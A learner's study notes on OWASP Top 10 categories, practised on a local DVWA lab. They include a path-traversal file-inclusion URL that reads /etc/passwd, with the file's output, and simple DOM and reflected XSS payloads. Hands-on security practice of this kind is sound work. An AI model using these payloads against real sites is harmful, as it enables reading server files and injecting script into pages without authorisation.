Installed DVWA in local machine and started to practice all methods. [[DVWA Installation]] #owasptop10

# Broken Access Control

1. IDOR (Insecure Direct Object Reference): Reading another user's account data by id number. 
2. Local File Inclusion: When a server-side app can display non-app files resident on the server. For example: User disclosure through /etc/passwd
3. Weak Authorization: When the application fails to protect sensitive content. For example: 'securing' admin pages with a readable cookie.
4. Security Through Obscurity: Secret paths tend not to stay secret. People aren't as inventive as they think. 

### File inclusion 

1. Changing links to get secret information. #localfileinclusion
~~~link
http://10.10.78.153/vulnerabilities/fi/?page=/etc/passwd

1. When security is low

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin libuuid:x:100:101::/var/lib/libuuid: syslog:x:101:104::/home/syslog:/bin/false messagebus:x:102:106::/var/run/dbus:/bin/false landscape:x:103:109::/var/lib/landscape:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin pollinate:x:105:1::/var/cache/pollinate:/bin/false ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash mysql:x:106:111:MySQL Server,,,:/nonexistent:/bin/false 

2. When security is high

ERROR: File not found!

3. Read source code and tried to exploit high security 

http://10.10.78.153/vulnerabilities/fi/?page=file/../../../../../../etc/passwd

oot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin libuuid:x:100:101::/var/lib/libuuid: syslog:x:101:104::/home/syslog:/bin/false messagebus:x:102:106::/var/run/dbus:/bin/false landscape:x:103:109::/var/lib/landscape:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin pollinate:x:105:1::/var/cache/pollinate:/bin/false ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash mysql:x:106:111:MySQL Server,,,:/nonexistent:/bin/false 

~~~
# Cryptographic Failures

1. Any misuse or lack of cryptographic security solutions.
2. Actually a little tricky to exploit. For example: HTTP/HTTPS, weak hashing
3. Password cracking comes under it. 

# XSS Injection

Abusing application functionality to create malicious JavaScript

### Dom-based 

Mutating the HTML document 

DOM-XSS
~~~Example
1 Low security
ip/vulnerabilities/xss_d/?default='></option></select> <h1>test</h1>

2 High security
ip/vulnerabilities/xss_d/?default='></option></select> <img src=x onerror="alert('XSS')"/>
~~~
### Reflected

URL parms displayed in the page. 

~~~Example
1. <script>alert('XSS')</script>
~~~
### Stored 

Saved data rendered for all viewers

# SQL Injection

# Insecure Design

# Security Misconfiguration 

# Vulnerable and Outdated Components

# Identification and Authentication Failures

# Software and Data Integrity Failures

# Security Logging and Monitoring Failures

# Server-Side Request Forgery

# Extra Practice 
